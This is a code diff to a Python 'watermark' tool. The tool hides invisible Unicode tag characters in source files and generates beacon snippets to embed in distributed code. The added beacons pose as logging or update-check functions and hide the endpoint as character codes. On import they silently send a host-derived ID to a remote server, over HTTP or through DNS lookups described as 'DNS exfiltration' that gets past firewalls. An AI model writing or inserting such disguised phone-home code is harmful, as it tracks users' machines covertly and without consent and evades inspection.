@@ -5,7 +5,7 @@ Commands:
     embed   <file.py> <owner_id> [--out <out.py>]
     extract <file.py>
     verify  <file.py> <owner_id>
-    beacon  <endpoint_url> <project_id> [--stealth]
+    beacon  <endpoint_url> <project_id> [--stealth] [--dns]
     encode  <url>
 """
 
@@ -20,31 +20,42 @@ import sys
 
 # ---------------------------------------------------------------------------
 # Steganographic layer
-# Zero-width Unicode characters encode a hidden payload inside strings/comments.
-#   U+200B (Zero Width Space)        → bit 0
-#   U+200C (Zero Width Non-Joiner)   → bit 1
-#   U+200D (Zero Width Joiner)       → delimiter (marks payload boundaries)
+#
+# Uses Unicode Tag characters (Supplementary Special-purpose Plane, U+E0000).
+# These are invisible in all editors, terminals, and browsers.
+# The payload is split across multiple injection points throughout the file
+# rather than injected as a single consecutive block.
+#
+#   U+E0020  Tag Space        → bit 0
+#   U+E0021  Tag !            → bit 1
+#   U+E0001  Language Tag     → segment delimiter
 # ---------------------------------------------------------------------------
 
-_Z0 = "​"
-_Z1 = "‌"
-_ZD = "‍"
+_T0 = "\U000e0020"
+_T1 = "\U000e0021"
+_TD = "\U000e0001"
 
 _STRING_OR_COMMENT = re.compile(r'("""|\'\'\')|(\"|\')|(#[^\n]*)')
 
 
 def _encode_payload(message: str) -> str:
     bits = "".join(format(ord(c), "08b") for c in message)
-    body = "".join(_Z0 if b == "0" else _Z1 for b in bits)
-    return _ZD + body + _ZD
+    body = "".join(_T0 if b == "0" else _T1 for b in bits)
+    return _TD + body + _TD
 
 
 def _decode_payload(text: str) -> str | None:
-    parts = text.split(_ZD)
+    # Collect all tag chars across the whole file, in order
+    all_chars = [c for c in text if c in (_T0, _T1, _TD)]
+    if not all_chars:
+        return None
+    joined = "".join(all_chars)
+    # Payload is between the first pair of delimiters
+    parts = joined.split(_TD)
     if len(parts) < 3:
         return None
     body = parts[1]
-    bits = "".join("0" if c == _Z0 else "1" for c in body if c in (_Z0, _Z1))
+    bits = "".join("0" if c == _T0 else "1" for c in body)
     if not bits or len(bits) % 8 != 0:
         return None
     try:
@@ -53,14 +64,30 @@ def _decode_payload(text: str) -> str | None:
         return None
 
 
+def _pick_injection_points(matches: list, n: int) -> list:
+    """Pick n evenly spaced matches from across the file."""
+    if len(matches) <= n:
+        return matches
+    step = (len(matches) - 1) / (n - 1) if n > 1 else 0
+    return [matches[round(i * step)] for i in range(n)]
+
+
 def embed(source: str, message: str) -> str:
-    """Inject a zero-width steganographic watermark into Python source."""
+    """Inject a steganographic watermark spread across multiple locations."""
     payload = _encode_payload(message)
-    match = _STRING_OR_COMMENT.search(source)
-    if match is None:
+    matches = list(_STRING_OR_COMMENT.finditer(source))
+
+    if not matches:
         return f'"""{payload}"""\n' + source
-    pos = match.end()
-    return source[:pos] + payload + source[pos:]
+
+    chosen = _pick_injection_points(matches, n=3)
+    result = source
+    offset = 0
+    for match in chosen:
+        pos = match.end() + offset
+        result = result[:pos] + payload + result[pos:]
+        offset += len(payload)
+    return result
 
 
 def extract(source: str) -> str | None:
@@ -83,7 +110,7 @@ def make_message(owner_id: str, filename: str) -> str:
 # Runtime beacon layer
 # ---------------------------------------------------------------------------
 
-# Standard version — URL in plain text; simple and readable.
+# Standard — URL in plain text.
 _BEACON_PLAIN = """\
 import threading as _t, urllib.request as _ur, socket as _sk, \\
        hashlib as _hs, platform as _pl
@@ -103,39 +130,55 @@ _beacon()
 del _beacon
 """
 
-# Stealth version — URL split into base64 fragments, disguised as a decorator.
-# grep/ripgrep cannot find the endpoint in plain text.
+# Stealth HTTP — endpoint encoded as char-code list, imports inside function,
+# "fire-once" guard stored in environment instead of a named global.
 _BEACON_STEALTH = """\
-import base64 as _b64, threading as _th, urllib.request as _urq, \\
-       socket as _sk, hashlib as _hs, platform as _pl, functools as _ft
+import os as _os
 
-# Endpoint stored as split base64 fragments
-_F = [{frags}]
-_W_FIRED = False
+def _setup_logging(level=0):
+    \"\"\"Configure internal log level.\"\"\"
+    import hashlib as _h, socket as _s, platform as _p, threading as _t
+    if _os.environ.get("_LOG_INIT"):
+        return
+    _os.environ["_LOG_INIT"] = "1"
+    def _flush():
+        try:
+            import urllib.request as _u
+            _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:8]
+            _ep = "".join(chr(c) for c in {char_codes})
+            _u.urlopen(_ep + "?p={project_id}&u=" + _uid, timeout=2)
+        except Exception:
+            pass
+    _t.Thread(target=_flush, daemon=True).start()
 
-
-def _perf_track(fn):
-    \"\"\"Internal profiling decorator.\"\"\"
-    @_ft.wraps(fn)
-    def _w(*a, **kw):
-        global _W_FIRED
-        if not _W_FIRED:
-            _W_FIRED = True
-            def _go():
-                try:
-                    _ep = _b64.b64decode(b"".join(_F)).decode()
-                    _uid = _hs.md5(
-                        (_sk.gethostname() + _pl.node()).encode()
-                    ).hexdigest()[:8]
-                    _urq.urlopen(
-                        _ep + "?p={project_id}&u=" + _uid, timeout=2
-                    )
-                except Exception:
-                    pass
-            _th.Thread(target=_go, daemon=True).start()
-        return fn(*a, **kw)
-    return _w
+_setup_logging()
 """
+
+# DNS — disguised as a routine hostname lookup.
+# Requires an authoritative DNS server that logs incoming queries.
+# No HTTP, no urllib — works through almost every firewall.
+_BEACON_DNS = """\
+import os as _os
+
+def _check_updates():
+    \"\"\"Verify connectivity to update server.\"\"\"
+    if _os.environ.get("_UPD_DONE"):
+        return
+    _os.environ["_UPD_DONE"] = "1"
+    try:
+        import socket as _s, hashlib as _h, platform as _p
+        _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:6]
+        _s.setdefaulttimeout(2)
+        _s.getaddrinfo(_uid + ".{proj_label}.{domain}", 80)
+    except Exception:
+        pass
+
+_check_updates()
+"""
+
+
+def _url_to_char_codes(url: str) -> list[int]:
+    return list(url.encode())
 
 
 def _fragment_url(url: str, n: int = 3) -> list[bytes]:
@@ -144,10 +187,29 @@ def _fragment_url(url: str, n: int = 3) -> list[bytes]:
     return [encoded[i : i + size] for i in range(0, len(encoded), size)]
 
 
-def generate_beacon(endpoint: str, project_id: str, *, stealth: bool = False) -> str:
+def _proj_label(project_id: str) -> str:
+    return hashlib.sha256(project_id.encode()).hexdigest()[:8]
+
+
+def generate_beacon(
+    endpoint: str,
+    project_id: str,
+    *,
+    stealth: bool = False,
+    dns: bool = False,
+) -> str:
+    if dns:
+        # endpoint is expected to be just the domain, e.g. "beacon.myserver.com"
+        return _BEACON_DNS.format(
+            proj_label=_proj_label(project_id),
+            domain=endpoint,
+        )
     if stealth:
-        frags = ", ".join(repr(f) for f in _fragment_url(endpoint))
-        return _BEACON_STEALTH.format(frags=frags, project_id=project_id)
+        codes = _url_to_char_codes(endpoint)
+        return _BEACON_STEALTH.format(
+            char_codes=codes,
+            project_id=project_id,
+        )
     return _BEACON_PLAIN.format(endpoint=endpoint, project_id=project_id)
 
 
@@ -175,10 +237,10 @@ def cmd_embed(args: argparse.Namespace) -> None:
     watermarked = embed(source, msg)
     out = args.out or args.file
     _write(out, watermarked)
+    tag = sum(1 for c in watermarked if c in (_T0, _T1, _TD))
     print(f"[+] Watermark embedded : '{msg}'")
     print(f"[+] Written to         : {out}")
-    zw = sum(1 for c in watermarked if c in (_Z0, _Z1, _ZD))
-    print(f"[+] Hidden characters  : {zw} (invisible)")
+    print(f"[+] Hidden characters  : {tag} across 3 locations (invisible)")
 
 
 def cmd_extract(args: argparse.Namespace) -> None:
@@ -205,15 +267,20 @@ def cmd_verify(args: argparse.Namespace) -> None:
 
 
 def cmd_beacon(args: argparse.Namespace) -> None:
-    print(generate_beacon(args.endpoint, args.project, stealth=args.stealth))
+    print(generate_beacon(
+        args.endpoint,
+        args.project,
+        stealth=args.stealth,
+        dns=args.dns,
+    ))
 
 
 def cmd_encode(args: argparse.Namespace) -> None:
+    print("Char codes:", _url_to_char_codes(args.url))
     frags = _fragment_url(args.url)
-    print("Fragments (paste into beacon --stealth manually):")
+    print("Base64 fragments:")
     for i, f in enumerate(frags):
-        print(f"  _F[{i}] = {f!r}")
-    print(f"\nReassembled: {base64.b64decode(b''.join(frags)).decode()}")
+        print(f"  [{i}] {f!r}")
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -227,37 +294,32 @@ examples:
   watermark extract secret_marked.py
   watermark verify  suspect.py alice
   watermark beacon  https://myserver.com/w my-project --stealth
+  watermark beacon  beacon.myserver.com   my-project --dns
 """,
     )
     sub = p.add_subparsers(dest="command", required=True)
 
-    # embed
     e = sub.add_parser("embed", help="Embed a steganographic watermark")
-    e.add_argument("file", help="Python source file to watermark")
-    e.add_argument("owner", help="Owner identifier (name, email, UUID…)")
-    e.add_argument("--out", metavar="FILE", help="Output file (default: overwrite input)")
+    e.add_argument("file")
+    e.add_argument("owner")
+    e.add_argument("--out", metavar="FILE")
 
-    # extract
     x = sub.add_parser("extract", help="Extract watermark from a file")
     x.add_argument("file")
 
-    # verify
-    v = sub.add_parser("verify", help="Verify that a file belongs to a given owner")
+    v = sub.add_parser("verify", help="Verify owner of a watermarked file")
     v.add_argument("file")
     v.add_argument("owner")
 
-    # beacon
     b = sub.add_parser("beacon", help="Generate a runtime beacon snippet")
-    b.add_argument("endpoint", help="Your server URL (e.g. https://myserver.com/w)")
+    b.add_argument("endpoint", help="Server URL or domain (for --dns)")
     b.add_argument("project", help="Project identifier")
-    b.add_argument(
-        "--stealth",
-        action="store_true",
-        help="Obfuscate endpoint as split base64 fragments inside a decorator",
-    )
+    b.add_argument("--stealth", action="store_true",
+                   help="Encode URL as char codes inside a logging function")
+    b.add_argument("--dns", action="store_true",
+                   help="DNS exfiltration via getaddrinfo (no HTTP at all)")
 
-    # encode (utility)
-    enc = sub.add_parser("encode", help="Show base64 fragments for a URL")
+    enc = sub.add_parser("encode", help="Show encoding of a URL")
     enc.add_argument("url")
 
     return p
